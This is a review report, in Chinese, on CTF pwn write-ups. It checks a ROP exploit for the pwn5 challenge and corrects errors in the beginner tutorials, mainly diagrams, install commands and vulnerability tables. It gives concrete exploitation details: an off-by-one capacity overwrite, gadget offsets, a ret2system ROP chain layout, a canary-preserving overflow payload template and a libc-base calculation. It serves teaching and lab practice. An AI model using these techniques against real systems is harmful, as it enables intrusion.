# Review Round 2 — ROP 基礎文件與 pwn5（讀者設定：完全沒學過 ROP/SROP、沒寫過 exploit）

審查對象（本輪實際讀取的最新版）：

| 檔案 | 行數（本輪審查時） |
|---|---|
| `wp/00_基礎知識_從零開始.md` | 895 |
| `wp/99_速查表.md` | 240 |
| `wp/README.md` | 124 |
| `pwn5/notes.md` | 1283 |
| `pwn5/exploit.py` | 170 |

驗證手段：`objdump -d -M intel`、`readelf -h/-S/-r/-l/-d/-n`、`gdb -q -batch`（單步走完整條 ROP 鏈、
量 `system@plt` 入口的 `rsp`）、`pwntools 4.15.0`（`process()` 原始碼、`cyclic`、`SigreturnFrame`、
`ROP`、`fmtstr_payload`）、`ROPgadget`、`checksec`、實際執行 `python3 exploit.py`（local ×3、REMOTE ×3、`run_all.sh` ×1）。

**結論先講：pwn5 的 exploit 是對的、可重跑的（local 3/3、REMOTE 3/3 都拿到真 flag）；
這一輪找到的問題幾乎都在「文件怎麼解釋」而不是「攻擊本身」。**

---

## 0. 先說結論：本輪逐一查證後確認「正確」的部分

避免只挑錯，以下是實測無誤、建議保留的關鍵宣告：

| # | 宣告 | 驗證結果 |
|---|---|---|
| 1 | `APPEND`（`0x174c`）off-by-one：`n = len-1`（`0x1779 sub eax,1`）、檢查 `cmp WORD PTR [rbp-0x12],ax` + `jbe`（`n <= capacity` 無號）、但迴圈 `0x17d6 cmp ax,[rbp-0x12]; jbe 17ac` 是 `i <= n` → 共寫 `n+1` 個 byte；來源是 `payload+1`（`0x1784 add rax,1`） | ✅ 逐條相符 |
| 2 | capacity = `state[0x100]`（16-bit），`0x0100` → `0x01ff`；第 257 個 byte（index `0x100`）落在 capacity 低位 byte，而它就是**訊框的 CRC byte** | ✅ 相符；且 CRC 對單一 byte **是雙射**（實測 256 個 v 產生 256 個不同 CRC），唯一解 `v=0xcd` 使 `crc8 == 0xff`（與 notes 第 794 行寫的 `205 (0xcd)` 一致） |
| 3 | `state = rbp-0x110`（`0x19e5`/`0x1a0d` 的 `lea rax,[rbp-0x110]`）、canary `= state+0x108 = rbp-8`、saved rbp `= state+0x110 = rbp`、回傳位址 `= state+0x118 = rbp+8` | ✅ 相符；`gdb_evidence.sh` 重跑得到 `rbp=0x7fffffffddd0 state=0x7fffffffdcc0`（差 `0x110`） |
| 4 | 洩漏到的回傳位址 = `PIE+0x1a9f`（`main` 在 `0x1a9a` `call 1865`，下一道是 `0x1a9f`） | ✅ 相符 |
| 5 | `pop rdi; ret` = `PIE+0x12aa`（`0x12a7 cmp DWORD PTR [rbp-0x14],0x1337c35f` 的立即值 `5f c3 37 13`，從 `0x12aa` 解碼就是 `5f pop rdi` / `c3 ret`） | ✅ `objdump --start-address=0x12aa`：`12aa: pop rdi` / `12ab: ret`；`ROP(elf).find_gadget(['pop rdi','ret'])` → `Gadget(0x12aa,…)` |
| 6 | `system@plt` = `PIE+0x10c0`（`.plt.sec`），`jmp QWORD PTR [rip+0x2eed]` → GOT `0x3fb8` | ✅ 相符；`elf.plt['system'] == 0x10c4` 也與 notes 第 878 行的註解一致 |
| 7 | `"/bin/sh"` = `PIE+0x4a54`（= `.bss` 接收緩衝區 `0x4864` + payload `0x1f0`），不是硬編字串、不依賴 libc | ✅ 相符；`.bss` = `0x4020`~`0x5060`，`0x4a54` 在範圍內；最後的 EJECT 訊框只覆寫 `0x4860..0x4867` |
| 8 | `/bin/echo -n ''` 是**死字串、沒有注入點**（`0x12ed lea rax,[rip+0xec2]` → `.rodata:0x21b6`） | ✅ `rodata[0x21b6] = b"/bin/echo -n ''\0"`；`cmd_echo` 全程沒有讀使用者輸入 |
| 9 | jump table `@ .rodata:0x21c8` 的 6 筆 int32（opcode 0~5 → `0x1a4f`/`0x197b`/`0x19d4`/`0x1a0d`/`0x1a39`/`0x1a1e`）、`cmp eax,0x5; ja 1a4f` | ✅ 手動解出 6 筆全部相符 |
| 10 | AUTH（`0x167c`）要求 `len == 5`、magic 大端序（`payload[1]<<24|…|payload[4]`）、成功後 `state[0x100]=0x100`、`state[0x102]=1` | ✅ 相符 |
| 11 | 訊框格式：`ESC[` + **big-endian** `L` + payload + CRC8 + `ESC\`；`L != 0` 且 `L+7 <= 0x800`（最大 `0x7f9`） | ✅ 相符；CRC 多項式 `0x2f` 的 Python 重實作能被伺服器接受（AUTH 回 status 0） |
| 12 | `.rela.plt` 有 6 筆 `R_X86_64_JUMP_SLO`（write/`__stack_chk_fail`/system/read/memcpy/setvbuf）+ `BIND_NOW` + `GNU_RELRO` → **Full RELRO** | ✅ 相符（`readelf -r/-d/-l`） |
| 13 | 檢查 `0x101a` 是乾淨的 `ret`（`.init` 結尾）、`0x101a` 可用來做 16-byte 對齊 | ✅ 相符 |
| 14 | 16-byte 對齊：`leave; ret` 後 `rsp = rbp+0x10`，補一個 `ret` 後 **`system` 第一道指令時 `rsp % 16 == 8`** | ✅ **單步 gdb 實測**：`leave` 後 `rsp=0x7fffffffddd8` → 對齊用 `ret`(`PIE+0x101a`) → `pop rdi;ret`(`PIE+0x12aa`) → `system@plt` 命中時 `rdi=0x555555558a54`、`rsp=0x7fffffffddf8`、`rsp&0xf=8` ✅ 與 notes §5.3 寫的一模一樣 |
| 15 | `gdb_evidence.sh` 的證據可重跑 | ✅ 我重跑得到與 notes §5.3 逐字相同的輸出（含 `capacity=0x1ff`、`state[0x118]=0x55555555501a`） |
| 16 | 遠端環境：`GCC: (Ubuntu 11.4.0-1ubuntu1~22.04.2) 11.4.0`（字串裡就有）、本機 glibc 2.44 | ✅ `strings` 相符；`/usr/lib/libc.so.6` = 2.44 |
| 17 | README 的 7 個 port、7 個 flag、7 題保護機制 | ✅ 全部逐項核對相符（`checksec` 實跑；port 與各 `exploit.py`、`run_all.sh` 的 `PORTS` 一致；flag 與各 `FLAG.txt` 一致） |
| 18 | `run_all.sh pwn5` 一鍵驗證 | ✅ 實跑成功拿到真 flag |

---

## 1. 錯誤清單

> 嚴重度：**P0** = 會讓新手做出壞掉的 payload 或第一步就卡死；**P1** = 事實錯誤／建立錯誤心智模型；
> **P2** = 小錯、不一致、可用性。
> 合計 **22 條：P0 × 5、P1 × 7、P2 × 10**。

### P0-1 ★ `pwn5/notes.md` 第 950–956 行（§7.1 堆疊／payload 圖）：整條 ROP 鏈**往上位移了一格**

* **原文**（第 950–955 行）：
  ```
   rbp+0x30 ├── chain[4]（system 的回傳位址）─────┤  state[0x140]
   rbp+0x28 ├── system@plt = PIE+0x10c0 ─────────┤  state[0x138]
   rbp+0x20 ├── "/bin/sh" = PIE+0x4a54 ──────────┤  state[0x130]
   rbp+0x18 ├── pop rdi; ret = PIE+0x12aa ───────┤  state[0x128]
   rbp+0x10 ├── ret = PIE+0x101a（16-byte 對齊用）┤  state[0x120] ← ret 後 rsp 指這裡
   rbp+0x08 ├── ★ 回傳位址（被我們蓋成 chain[0]）─┤  state[0x118]
  ```
* **錯在哪**：`chain = [ret, pop_rdi, binsh, system, 0]`，而 `chain[0]` 就放在被蓋掉的回傳位址
  （`state[0x118]`）。所以對齊用的 `ret` **只會出現一次**（在 `state[0x118]`），
  圖卻在 `state[0x120]` 又放了一個 `ret`，導致 `state[0x120]` 之後每一格都往上偏一格。
  正確值是：

  | state 偏移 | 位址 | 內容 | 值（PIE base = `0x555555554000`） |
  |---|---|---|---|
  | `state[0x118]` | `rbp+0x08` | `chain[0]` = 對齊用 `ret` | `0x55555555501a`（PIE+`0x101a`） |
  | `state[0x120]` | `rbp+0x10` | `chain[1]` = `pop rdi; ret` | `0x5555555552aa`（PIE+`0x12aa`） |
  | `state[0x128]` | `rbp+0x18` | `chain[2]` = `"/bin/sh"` | `0x555555558a54`（PIE+`0x4a54`） |
  | `state[0x130]` | `rbp+0x20` | `chain[3]` = `system@plt` | `0x5555555550c0`（PIE+`0x10c0`） |
  | `state[0x138]` | `rbp+0x28` | `chain[4]` = `system` 的回傳位址 | `0` |

* **這不是猜的，是同一頁自己打自己**：`notes.md` 第 814 行（§5.3 的 gdb 輸出）寫的是
  `0x7fffffffdde8: 0x…8a54  0x…50c0  <- chain: "/bin/sh", system@plt`，
  而 `0x7fffffffdde8 = rbp+0x18`、`0x7fffffffddf0 = rbp+0x20` —— **§5.3 是對的，§7.1 是錯的**。
* **為什麼 P0**：新手照這張圖排 payload，會得到「`state[0x118]=ret`、`state[0x120]=ret`、
  `state[0x128]=pop_rdi`、`state[0x130]=binsh`、`state[0x138]=system`」——
  鏈多走一格 8 bytes，於是 `system` 入口變成 `rsp % 16 == 0` → **`movaps` SIGSEGV**，
  而錯誤訊息完全不會告訴你原因（正是本題 §6.3 自己在教的對齊陷阱）。
* **驗證指令**（可直接重跑，會印出真實布局）：
  ```bash
  cd pwn5 && cat > /tmp/p5.gdb <<'EOF'
  set pagination off
  set confirm off
  set debuginfod enabled off
  set disable-randomization on
  b *0x555555554000+0x1797
  b *0x555555554000+0x1810
  b *0x555555554000+0x1a76
  b *0x555555554000+0x10c0
  run < exploit_input.bin
  continue
  continue
  continue
  set $pc = 0x555555554000+0x1a7d
  continue
  printf "@system@plt  rdi=%#lx  rsp=%#lx  rsp&0xf=%ld\n", $rdi, $rsp, ((unsigned long)$rsp)%16
  x/6gx 0x7fffffffddd8
  quit
  EOF
  gdb -q -batch -x /tmp/p5.gdb ./homemaker
  # 實測輸出：
  #   0x7fffffffddd8: 0x000055555555501a 0x00005555555552aa   <- rbp+8=ret, rbp+0x10=pop rdi
  #   0x7fffffffdde8: 0x0000555555558a54 0x00005555555550c0   <- rbp+0x18=/bin/sh, rbp+0x20=system
  #   @system@plt  rdi=0x555555558a54  rsp=0x7fffffffddf8  rsp&0xf=8
  ```
* **建議替換文字**（把第 950–956 行整段換掉）：
  ```
   rbp+0x38 ├── (state[0x148]) ───────────────────┤
   rbp+0x30 ├── (state[0x140]，沒用到)────────────┤
   rbp+0x28 ├── chain[4] = 0（system 的回傳位址）─┤  state[0x138]   ← system 入口時 rsp 指這裡
   rbp+0x20 ├── chain[3] = system@plt = PIE+0x10c0┤  state[0x130]
   rbp+0x18 ├── chain[2] = "/bin/sh" = PIE+0x4a54 ┤  state[0x128]
   rbp+0x10 ├── chain[1] = pop rdi; ret = PIE+0x12aa┤ state[0x120] ← 「ret 之後 rsp 指這裡」
   rbp+0x08 ├── chain[0] = ★ 回傳位址（對齊用 ret = PIE+0x101a）┤ state[0x118]
   rbp      ├── ★ saved rbp（保留原值）──────────┤  state[0x110]
   rbp-0x08 ├── ★ stack canary（必須原樣寫回）────┤  state[0x108]
  ```

### P0-2 ★ `wp/00_基礎知識_從零開始.md` 第 312–332 行（§6.3 堆疊框架圖）：**`buf` 與 `canary` 上下顛倒**

* **原文**（第 324–330 行）：
  ```
          │  saved rbp  ← push rbp    │  ← rbp+0  ← rbp 指向這
          ├──────────────────────────┤
          │  char buf[0x30]           │  ← rbp-0x30
          ├──────────────────────────┤
          │  canary                   │  ← rbp-0x8
          └──────────────────────────┘  ← rsp
  位址低
  ```
* **錯在哪**：圖是由上（高位址）往下（低位址）畫的，`rbp-0x30` **比** `rbp-0x8` **低**，
  所以 `canary` 應該畫在 `buf` **上面**（更靠近 `rbp`）。現在的畫法讓 `canary` 看起來在 `buf` 下面，
  新手會推出「溢位先撞到 canary 再撞到 buf」的相反結論。
  這也跟同檔第 340 行自己寫的「`canary` 通常緊貼 `rbp-8`」互相矛盾。
* **連帶缺失**：整節只給了 `offset = (rbp - &buf) + 8`，**沒有給「canary 在 buf 之後幾個 byte」**，
  而本系列 pwn1/pwn5/pwn7 都會遇到 canary（pwn5 的 canary 就正好在 `state+0x108`，距陣列起點 `0x108`）。
* **驗證**：GCC/glibc 標準佈局；且 `pwn5` 的實測值本身就是反例——
  `state` 起點 `state[0x000]`、canary 在 `state[0x108]`（**比緩衝區高**）。
* **建議替換文字**（把第 324–330 行換成）：
  ```
          │  saved rbp  ← push rbp    │  ← rbp+0  ← rbp 指向這
          ├──────────────────────────┤
          │  canary                   │  ← rbp-0x8   ← 最靠近 rbp，所以最先被撞到
          ├──────────────────────────┤
          │  char buf[0x30]           │  ← rbp-0x30
          └──────────────────────────┘  ← rsp ≈ rbp-0x40
  位址低
  ```

  並在圖下面補：
  ```markdown
  **溢位時你依序會蓋到：`buf` 尾端 → canary → saved rbp → 回傳位址。**所以：

  ```
  canary 的 offset = (rbp - 8) - &buf = 0x28     # 以 buf[0x30] 為例
  回傳位址的 offset = (rbp + 8) - &buf = 0x38
  ```

  有 canary 的題目，payload 一定要長成：
  `b"A" * canary_offset + <原封不動的 canary> + <saved rbp（可填垃圾）> + <回傳位址>`。
  canary 的**最後一個 byte 一定是 `0x00`**（因為它是從 `fs:0x28` 拿來的 8 bytes，最低位 byte 固定為 0），
  但**不要只補那一個 byte**——要整條 8 bytes 用洩漏到的原值寫回去（見 pwn5 §7.3）。
  ```

### P0-3 ★ `wp/00_基礎知識_從零開始.md` 第 78–88、104–110 行（§2 環境安裝）：**`pip install` 在本檔自己指定的 Arch 上直接失敗**

* **原文**：
  * 第 80 行 `pip install pwntools`（Arch / Manjaro 區塊）
  * 第 88 行 `pip3 install pwntools`（Ubuntu / Debian 區塊）
  * 第 105 行 `pip install pwntools                 # pwn 神器`
  * 第 107 行 `pip install ropgadget                # 找 gadget`
* **錯在哪**：現在的主流發行版 Python 都帶 **PEP 668** 的 `EXTERNALLY-MANAGED` 標記，
  `pip install` 會被拒絕（Ubuntu 24.04 / Arch 皆是）。本機（Arch、Python 3.14）**實測失敗**。
  這是新手照著做的**第一步**，失敗訊息又長又嚇人（"error: externally-managed-environment"）。
* **驗證指令**：
  ```bash
  python3 -m pip install --dry-run pwntools
  # → error: externally-managed-environment ... hint: See PEP 668 for the detailed specification.
  ls /usr/lib/python3.14/EXTERNALLY-MANAGED    # → 存在
  pacman -Si python-pwntools                   # → extra/python-pwntools 4.15.0-2（Arch 有現成套件）
  ```
* **建議替換文字**（Arch 區塊）：
  ```bash
  # Arch / Manjaro（推薦：用官方套件，不要用 pip 裝系統 Python）
  sudo pacman -S python-pwntools gdb           # python-pwntools 就在 extra
  sudo pacman -S python-pip                    # 若真的要用 pip，見下面「PEP 668」說明
  ```
  並在 §2「常用工具」區塊最前面加一段：
  ```markdown
  > ⚠️ **現代 Linux 不能直接 `pip install`（PEP 668）**
  > 如果你看到 `error: externally-managed-environment`，那是發行版在保護系統 Python，
  > 不是你的指令打錯。三個選項（挑一個）：
  >
  > ```bash
  > # A. 用發行版套件（最推薦）
  > sudo pacman -S python-pwntools        # Arch
  > sudo apt install python3-pwntools     # Ubuntu（社群套件，版本可能較舊）
  >
  > # B. 用 venv（乾淨、不污染系統）
  > python3 -m venv ~/.pwn && source ~/.pwn/bin/activate
  > pip install pwntools ropgadget
  >
  > # C. 硬要裝進系統 Python（有風險，自己負責）
  > pip install --break-system-packages pwntools ropgadget
  > ```
  > 本文件後面的 `python3 -c "from pwn import *"` 需要上面任一種安裝成功才能跑。
  ```

### P0-4 ★ `wp/00_基礎知識_從零開始.md` 第 730 行（§12）：`DEBUG=1 python3 exploit.py` **沒有作用**

* **原文**：`DEBUG=1 python3 exploit.py     # pwntools 的除錯模式`
* **錯在哪**：pwntools 的除錯開關是走 **`sys.argv`**（`pwnlib.args`），不是環境變數。
  實測 `DEBUG=1 python3 -c "from pwn import *; print(context.log_level)"` → `20`（info，**沒變**）；
  而 `python3 exploit.py DEBUG` → `10`（debug）✅。新手照著打會以為「除錯模式開了」其實沒有。
* **驗證指令**：
  ```bash
  DEBUG=1 python3 -c "from pwn import *; print('env  ->', context.log_level)"   # 20
  python3 -c "
  import sys; sys.argv=['x.py','DEBUG']
  from pwn import *
  print('argv ->', context.log_level)"                                          # 10
  ```
* **建議替換文字**：
  ```
  python3 exploit.py DEBUG       # pwntools 除錯模式（注意：是「命令列參數」不是環境變數）
  DEBUG=1 python3 exploit.py     # ← 這個沒有用！pwntools 不看環境變數
  ```
  並且因為 `pwnlib.args` 會把 `DEBUG` 從 `sys.argv` 吃掉，**要自己讀 `sys.argv` 的參數必須在
  `from pwn import *` 之前讀**（pwn5/exploit.py 第 17 行就是這樣做的，可當範例）。

### P0-5 ★ `wp/README.md` 第 43–60 行（檔案結構樹）：**層級畫錯，而且列了兩個不存在的檔案**

* **原文**（節錄）：
  ```
  sunshine/
  ├── README.md                     ← 你現在看的這份（索引）
  ├── 00_基礎知識_從零開始.md
  ├── 99_速查表.md
  ├── run_all.sh
  ├── review_round1.md
  ├── fixes_round1_applied.md
  ├── review_round2.md              ← 第 2 輪審查報告
  ├── review_round3.md              ← 第 3 輪審查報告（最終驗證）
  │
  ├── pwn1/  challenge  exploit.py  FLAG.txt  notes.md
  ```
* **錯在哪（兩件事）**：
  1. **層級錯**：`README.md`、`00_基礎知識…`、`99_速查表…`、`run_all.sh`、三份 `review_*.md`、
     `fixes_round1_applied.md` **全部在 `wp/` 底下**，不是跟 `pwn1`~`pwn7` 同層。
     正確樹根應該寫 `wp/`，然後 `../pwn1/` … 或在 `sunshine/` 那層列出 `wp/` 這個子目錄。
  2. **`review_round2.md`、`review_round3.md` 這兩個「檔名」不存在**（實測 MISSING）。
     實際上第 2 輪的報告是以主題拆檔命名（`review_round2_stack.md`、`review_round2_fmtstr.md`、
     `review_round2_rop_foundations.md`…），README 寫的單一檔名找不到東西。
     另外存在的 `wp/00_recon.md` 沒被列進去。
* **驗證指令**：
  ```bash
  ls -1 wp/
  # 00_recon.md  00_基礎知識_從零開始.md  99_速查表.md  fixes_round1_applied.md
  # README.md  review_round1.md  run_all.sh          ← 沒有 review_round2/3.md、沒有本檔
  for f in review_round2.md review_round3.md 00_recon.md; do
    [ -f wp/$f ] && echo "wp/$f EXISTS" || echo "wp/$f MISSING"; done
  # → MISSING / MISSING / EXISTS
  ```
* **建議替換文字**：
  ```
  sunshine/
  ├── wp/                                    ← 教學與審查文件都在這裡
  │   ├── README.md                          ← 你現在看的這份（索引）
  │   ├── 00_基礎知識_從零開始.md
  │   ├── 99_速查表.md
  │   ├── 00_recon.md                        ← 7 題清單／port／保護速查
  │   ├── run_all.sh                         ← 一鍵重跑全部 7 題（打遠端）
  │   ├── review_round1.md                   ← 第 1 輪審查報告
  │   ├── fixes_round1_applied.md            ← 第 1 輪修正紀錄
  │   ├── review_round2_rop_foundations.md   ← 第 2 輪審查報告（ROP 基礎 + pwn5，本檔）
  │   ├── review_round2_stack.md             ← 第 2 輪審查報告（堆疊類題目）
  │   ├── review_round2_fmtstr.md            ← 第 2 輪審查報告（fmt string 類題目）
  │   └── review_round3.md                   ← 第 3 輪審查報告（完成後才會出現）
  │       （※ 建議 README 用「glob 說明」而不是寫死檔名：
  │         「第 2 輪報告＝`review_round2_*.md`」，否則每次新增報告都要改 README）
  │
  ├── pwn1/  challenge  exploit.py  FLAG.txt  flag.txt  notes.md
  ├── pwn2/  mad_libs   exploit.py  FLAG.txt  flag.txt  notes.md  ld-linux-x86-64.so.2  libc.so.6
  ├── pwn3/  revolution exploit.py FLAG.txt  flag.txt  notes.md  libc-2.39-0ubuntu8.3.so.6
  ├── pwn4/  cache_money exploit.py FLAG.txt flag.txt  notes.md  ld-linux-x86-64.so.2  libc.so.6
  ├── pwn5/  homemaker  exploit.py  FLAG.txt  flag.txt  notes.md  gdb_evidence.sh
  ├── pwn6/  code_breaker exploit.py FLAG.txt flag.txt notes.md  ld-linux-x86-64.so.2  libc.so.6
  └── pwn7/  service    exploit.py  FLAG.txt  FLAG_REMOTE.txt  flag.txt  notes.md
  ```
  （`flag.txt` 是題目附的假 flag，用來本地 `cat flag.txt` 測試；`FLAG.txt` = 遠端實打到的真 flag）

### P1-1 `pwn5/notes.md` 第 1212–1214 行（§11 常見坑 #1）：**「`process()` 預設用 PTY，訊框送不進去」是錯的**

* **原文**：
  > 1. **`process()` 預設用 PTY**：pwntools 的 `process('./homemaker')` 預設把 stdin/stdout 接到 pseudo-terminal，
  >    PTY 是 canonical mode（要按 Enter 才送資料）→ 二進位訊框永遠送不進去，程式卡在 `read`。
  >    **解法：`process(BIN, stdin=process.PIPE, stdout=process.PIPE)`**。（remote 沒這問題。）
* **錯在哪（三點）**：
  1. pwntools 4.15.0 的 `process()` 預設是 **`stdin=PIPE`**（不是 PTY）——所以「binary 訊框被 canonical mode 吃掉」根本不會發生；
  2. 預設 `stdout=PTY` 沒錯，但同時 `raw=True`，pwntools 會把 PTY 設成 **raw mode**，不是 canonical；
  3. **實測把 exploit 改成 `process(BIN)` 一樣能拿到 flag**（我實跑過，見 §4）。
* **驗證指令**：
  ```bash
  python3 - <<'EOF'
  import inspect, pwnlib.tubes.process as m
  src = inspect.getsource(m.process.__init__)
  print(src[src.find('def __init__'):src.find('def __init__')+400])
  EOF
  #   stdin  = PIPE,
  #   stdout = PTY if not IS_WINDOWS else PIPE,
  #   stderr = STDOUT,
  #   ...
  #   raw = True,
  python3 - <<'EOF'
  from pwn import *; context.log_level='error'
  import os
  p = process('./pwn5/homemaker')
  print('fd0 ->', os.readlink('/proc/%d/fd/0' % p.pid))   # pipe:[...]  ← stdin 是 pipe
  print('fd1 ->', os.readlink('/proc/%d/fd/1' % p.pid))   # /dev/pts/0  ← 只有 stdout 是 PTY
  p.close()
  EOF
  ```
* **建議替換文字**：
  ```markdown
  1. **`process()` 的 stdout 預設是 PTY（不是 pipe），但 stdin 預設是 pipe**：
     pwntools 的 `process('./homemaker')` 等於 `stdin=PIPE, stdout=PTY, stderr=STDOUT, raw=True`。
     因為 `raw=True`，PTY 會被設成 **raw mode**（不是 canonical），所以二進位訊框其實送得進去、
     這題用預設值也能跑成功（實測過）。我們在 `exploit.py` 明寫
     `process(BIN, stdin=process.PIPE, stdout=process.PIPE)` 只是為了：
     * 讓 stdout 也走 pipe（輸出不會被 PTY 的終端機行為影響，`recvuntil`/`recvrepeat` 更可預期）；
     * 讓本機與遠端（本來就是 socket）的行為一致，少一個變數。
     **真正會卡住的情況是**：你在 shell 裡手動 `./homemaker` 然後想用管線餵二進位訊框，
     或用了 `stdin=process.PTY` 又沒關 canonical mode——那時才需要處理「要按 Enter」的問題。
     （除錯小技巧：`ls -l /proc/<pid>/fd/0` 看 stdin 到底是 pipe 還是 /dev/pts/N。）
  ```

### P1-2 `wp/00_基礎知識_從零開始.md` 第 440、442 行（§9 漏洞對照表）：**pwn6 掛在兩個錯誤的漏洞類型上**

* **原文**：
  ```
  | **Missing bounds check** | 長度沒檢查就 `memcpy(dst, src, len)` | pwn3、pwn6 |
  | **Uninitialised memory** | 沒初始化就讀 → 洩漏堆疊 | pwn6 |
  ```
* **錯在哪**：pwn6 `code_breaker` 的漏洞是「clone 指令的 **refcount 算錯** ⇒ 同一塊 chunk 被 `free()` 兩次
  ⇒ double free + use-after-free」，不是長度沒檢查、也不是未初始化記憶體。
  pwn6 自己的筆記（`pwn6/notes.md`）寫得很明確：
  * 第 18–19 行：「複製（clone）時引用計數（refcount）算錯」⇒ double free + UAF；
  * 第 1042–1043 行：「**沒有**『nonce 沒讀到 ⇒ 用殘留 stack』的漏洞」← 這一項正是本表聲稱存在的漏洞。
* **驗證指令**：
  ```bash
  sed -n '10,25p' pwn6/notes.md
  sed -n '1040,1045p' pwn6/notes.md
  grep -n "refcount\|clone" pwn6/notes.md | head
  ```
* **建議替換文字**：
  ```
  | **Missing bounds check** | 長度沒檢查就 `memcpy(dst, src, len)` | pwn3 |
  | **Reference count bug**   | 引用計數算錯 → 同一塊被 `free()` 兩次 | pwn6 |
  | **Logic bug** | 程式邏輯本身有洞（迴圈上界、簽章檢查…） | pwn5（off-by-one）、pwn6（refcount） |
  ```
  （「Uninitialised memory」這一列本系列沒有對應題目，建議直接刪掉，或改成
  「**本系列沒有**：pwn6 檢查過短讀，所以沒有殘留 stack 洩漏」當反例教學。）

### P1-3 `wp/00_基礎知識_從零開始.md` 第 886 行（附錄對照表）：**pwn6 的核心技巧寫成 ROP**

* **原文**：`| code_breaker | pwn6/code_breaker | 26005 | PIE + canary → ROP | ../pwn6/notes.md |`
* **錯在哪**：pwn6 **完全不用 ROP chain**（`pwn6/notes.md` 第 24 行：
  「**完全不需要 ROP chain**」）。真正的技巧是 heap double free / UAF → tcache poisoning →
  覆寫 `.bss` 的函式指標 `[PIE+0x40c0]` 成 `system@plt`。README 第 19 行寫的是對的，這一格是錯的。
* **驗證指令**：`sed -n '10,30p' pwn6/notes.md` ／ `sed -n '19p' wp/README.md`
* **建議替換文字**：
  ```
  | code_breaker | `pwn6/code_breaker` | 26005 | PIE + canary + Heap（refcount → double free/UAF）→ tcache poisoning → 覆寫 .bss 函式指標 | `../pwn6/notes.md` |
  ```

### P1-4 `wp/00_基礎知識_從零開始.md` 第 436 行（§9）：**「Stack Buffer Overflow」列漏了 pwn5**

* **原文**：`| **Stack Buffer Overflow** | char buf[64]; read(0, buf, 1024); | pwn1、pwn7 |`
* **錯在哪**：pwn5 的 `state` 陣列就在 `service_loop` 的堆疊上（`rbp-0x110`），
  被 `APPEND` 的 off-by-one 溢寫——是標準的 stack buffer overflow。
  README 第 84 行也把 pwn5 歸在「堆疊類（pwn1、pwn5、pwn7）」，兩份文件互相矛盾。
* **驗證**：`objdump -d -M intel --start-address=0x19e5 --stop-address=0x19f7 pwn5/homemaker`
  → `lea rax,[rbp-0x110]`；`gdb_evidence.sh` 顯示 `rbp=0x7fffffffddd0 state=0x7fffffffdcc0`。
* **建議替換文字**：`| **Stack Buffer Overflow** | char buf[64]; read(0, buf, 1024); | pwn1、pwn5（state 在堆疊上）、pwn7 |`

### P1-5 `wp/00_基礎知識_從零開始.md`：**全篇沒有解釋「libc base + offset」**（只出現名詞）

* **現況**：`libc base` 一詞只出現在第 763 行（`vmmap # 找 libc base`）與第 844 行
  （「需要 leak 嗎？（PIE / canary / libc base）」），**沒有任何地方說明怎麼算**。
  但 §12 有 `libc = ELF('./libc.so.6')`、`libc.symbols['system']`、
  `next(libc.search(b'/bin/sh'))`，§15 又說「遠端 libc 版本可能不同 → 附的 libc 優先使用」——
  新手會直接卡在「我知道要 leak，但 leak 到一個 `0x7f…` 之後呢？」
* **驗證指令**：
  ```bash
  grep -n "libc base\|libc_base" wp/00_基礎知識_從零開始.md wp/99_速查表.md
  # → 只有 00 的 763/844 與 99 的 224，全是名詞、沒有算式
  ```
* **建議新增**（放在 §4.3「PIE / ASLR」那段的後面，因為那裡已經講了「base + offset」）：

  ```markdown
  ### 4.3.1 PIE base + offset 與 libc base + offset 是兩個不同的東西

  兩者長得一樣（都是「基底 + 位移」），但**位移的來源不同，不能混用**：

  | | PIE（執行檔本體） | libc（`libc.so.6`） |
  |---|---|---|
  | 位移從哪來 | `objdump` / `readelf` 看到的位址（就是 ELF 檔內的位址） | `libc.symbols['system']`、`libc.search(b'/bin/sh')`（libc 檔內的位址） |
  | 洩漏來源 | 堆疊上「指回程式碼段」的回傳位址、`.got` 內容、`printf` 印出的位址 | `libc` 函式的 GOT 值、`__libc_start_main+…`、`environ`、`%N$s` 讀 GOT |
  | 換算 | `PIE_base = 洩漏值 - <該位置的 offset>` | `libc_base = 洩漏值 - <該符號的 offset>` |
  | 之後怎麼用 | `gadget = PIE_base + 0x12aa` | `system = libc_base + libc.symbols['system']` |

  ```python
  # 例：從 GOT 洩漏 printf 的真實位址
  libc = ELF('./libc.so.6', checksec=False)
  libc.address = leaked_printf - libc.symbols['printf']     # ← libc base
  system = libc.symbols['system']                            # ← pwntools 會自動加 libc.address
  binsh  = next(libc.search(b'/bin/sh'))
  ```

  > ⚠️ **兩個常見錯誤**
  > 1. 把 PIE 的 offset 拿去加 libc base（或反過來）→ 鏈會跳到莫名其妙的位址，通常是 SIGSEGV。
  > 2. **libc 版本必須跟遠端一致**：`system` 的位移在不同 glibc 完全不同
  >    （本系列本機 Arch glibc **2.44**、遠端 Ubuntu 22.04 glibc **2.35**）。
  >    所以**有附 libc 就用附的**（`libc = ELF('./libc.so.6')`，不要用 `/usr/lib/libc.so.6`），
  >    並且優先用 `./ld-linux-x86-64.so.2 --library-path . ./chal` 在本機重現遠端環境。
  > 3. **PIE base 一定是 `0x1000` 對齊的**（`PIE_base & 0xfff == 0`），libc base 也一樣。
  >    算完一定要 assert 一下，這是最便宜的自我檢查。
  ```

### P1-6 `wp/00_基礎知識_從零開始.md` 第 617 行（§11.4）：`struct sigcontext` 在「定義之前」就被使用

* **原文**：
  > `struct sigcontext` 的欄位順序是固定的（offset 請見 `../pwn1/notes.md` 第 5.3 節），
  > pwntools 幫你排好，**不要自己手刻**。
* **錯在哪**：閱讀順序是 `00` → `pwn1`，讀者還沒讀到 `pwn1` §5.1/§5.3 的四個名詞表
  （`rt_sigframe` / `ucontext` / `struct sigcontext` / `sigframe`），這裡就要求他去看還沒讀的章節。
  round 1 的 B4 修正把定義補在 `pwn1`，但 `00` 這一句還是往前指。
* **建議替換文字**：
  ```markdown
  這裡的四個名字很容易混，先記這張表（完整版在 `../pwn1/notes.md` §5.1）：

  | 名字 | 是什麼 |
  |---|---|
  | `rt_sigframe` | 核心在處理 signal 時，放在使用者堆疊上的「整包」結構（x86-64 約 `0xf8` bytes） |
  | `struct sigcontext` | 這包裡面真正存「所有暫存器」的那一段，`r8` 從 offset `0x28` 開始 |
  | `SigreturnFrame()` | pwntools 產生的那 `0xf8` bytes；**它就是我們要塞上堆疊的東西** |

  `struct sigcontext` 的欄位順序是固定的，pwntools 幫你排好，**不要自己手刻**。
  ```

### P1-7 `pwn5/notes.md`：**沒有寫「exploit.py 必須在 `pwn5/` 目錄下執行」**

* **現況**：`grep -n "cd pwn5\|在題目目錄\|相對路徑" pwn5/notes.md` → **無輸出**。
  round 1 的 B8 只補了 `pwn1`、`pwn7` 與 `wp/00` §12，pwn5 漏掉。
